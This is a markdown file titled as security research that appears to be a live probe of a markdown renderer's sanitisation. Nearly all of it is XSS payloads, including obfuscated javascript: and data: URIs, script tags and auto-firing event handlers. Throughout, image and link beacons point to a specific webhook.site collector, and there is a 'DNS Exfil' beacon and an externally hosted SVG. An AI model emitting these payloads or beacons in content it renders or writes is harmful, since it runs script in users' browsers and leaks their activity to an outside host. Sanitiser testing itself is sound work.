# Security Research - v40

## Advanced Markdown Edge Cases & Escaping

Testing complex escaping scenarios, nested markdown, and edge cases.

---

### 1) Backslash Escaping Attacks

\[test\](javascript:alert(1))

\<script\>alert(1)\</script\>

\![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/escaped-img.gif)

[normal](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/normal-link)

---

### 2) HTML Entity Encoding in Markdown

&#60;script&#62;alert(1)&#60;/script&#62;

&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

&lt;script&gt;alert(1)&lt;/script&gt;

![img](&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1))

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Entity JS</a>

---

### 3) Unicode Normalization

<a href="j\u0061v\u0061script:alert(1)">Unicode escape JS</a>

<a href="jаvаscript:alert(1)">Cyrillic а</a>

<a href="ｊａｖａｓｃｒｉｐｔ:alert(1)">Fullwidth JS</a>

![Cyrillic](hｔｔｐｓ://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fullwidth.gif)

---

### 4) Whitespace Injection

<a href="java
script:alert(1)">Newline in protocol</a>

<a href="java	script:alert(1)">Tab in protocol</a>

<a href=" javascript:alert(1)">Leading space</a>

<a href="javascript :alert(1)">Space before colon</a>

<a href="\njavascript:alert(1)">Escaped newline</a>

---

### 5) URL Fragment/Query Injection

[Fragment](https://example.com#<script>alert(1)</script>)

[Query XSS](https://example.com?q=<script>alert(1)</script>)

![Fragment img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/fragment.gif#<script>)

![Query img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/query.gif?xss=<script>)

---

### 6) Reference Links Abuse

[Click me][xss]

[xss]: javascript:alert(1)

[Click me 2][xss2]

[xss2]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ref-link.gif "<script>alert(1)</script>"

[Image ref][imgref]

[imgref]: https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/img-ref.gif

---

### 7) Nested Markdown Constructs

**bold _italic **nested** close_ end**

***bold italic [link](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/nested-format.gif) text***

~~strikethrough **with bold** and _italic_~~

> Blockquote with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/blockquote.gif)
> And <script>alert(1)</script>

---

### 8) Code Block Escaping

```html
<script>alert('code block')</script>
```

    <script>alert('indented code')</script>

```
![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/inside-code.gif)
```

---

### 9) List Item XSS

- Normal item
- <script>alert('list item')</script>
- ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/list-item.gif)
- [link](javascript:alert(1))

1. Ordered item
2. <script>alert('ordered')</script>
3. ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/ordered-item.gif)

---

### 10) Definition List Style (if supported)

Term 1
: Definition with <script>alert(1)</script>

Term 2
: Definition with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/definition.gif)

---

### 11) Checkbox/Task List XSS

- [ ] Unchecked <script>alert(1)</script>
- [x] Checked ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/checkbox.gif)
- [ ] <a href="javascript:alert(1)">JS link in task</a>

---

### 12) Footnote XSS (if supported)

Text with footnote[^1]

[^1]: Footnote content <script>alert('footnote')</script> ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/footnote.gif)

Another footnote[^xss]

[^xss]: javascript:alert(1)

---

### 13) Table Cell Edge Cases

| Header | XSS |
|--------|-----|
| Cell | `<script>` in code |
| <img src=x onerror=alert(1)> | Error handler |
| <a href="javascript:void(0)">void</a> | Void JS |
| ![](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/table-cell.gif) | Image |

---

### 14) Mixed HTML and Markdown

<div>

**Bold inside div**

![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/div-img.gif)

</div>

<p>Paragraph with ![img](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/p-img.gif)</p>

<span onclick="alert(1)">Click span</span>

---

### 15) URL Scheme Variations

<a href="JAVASCRIPT:alert(1)">Uppercase JS</a>

<a href="JaVaScRiPt:alert(1)">Mixed case JS</a>

<a href="vbscript:msgbox(1)">VBScript</a>

<a href="VBScript:msgbox(1)">Uppercase VBS</a>

<a href="data:text/html,<script>alert(1)</script>">Data HTML</a>

<a href="DATA:text/html,<script>alert(1)</script>">Uppercase data</a>

---

### 16) SVG in Markdown Link

![SVG](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)

[![SVG Link](https://raw.githubusercontent.com/jessi2000/progsjessi/main/test.svg)](javascript:alert(1))

---

### 17) Base64 Data URI

<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">

![Base64](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

---

### 18) Protocol-Relative URLs

![Proto relative](//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-relative.gif)

<a href="//webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/proto-rel-link">Proto relative link</a>

---

### 19) Null Byte Injection

<a href="java%00script:alert(1)">Null in protocol</a>

![Null](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/null%00byte.gif)

---

### 20) Raw HTML Event Handlers (Extended)

<body onload="alert(1)">

<div onmouseover="alert(1)">Hover me</div>

<input onfocus="alert(1)" autofocus>

<video autoplay onloadstart="alert(1)"><source src="x">

<audio autoplay onloadstart="alert(1)"><source src="x">

<marquee onstart="alert(1)">Marquee</marquee>

<isindex action="javascript:alert(1)">

---

### DNS Exfil

![DNS](https://v40-dns.b4dc6012-cc6b-4692-a1a9-2a4a42693934.dnshook.site/dns.gif)

### Canary

![Canary](https://webhook.site/b4dc6012-cc6b-4692-a1a9-2a4a42693934/v40-canary.gif)

---

*v40 - Advanced markdown edge cases*
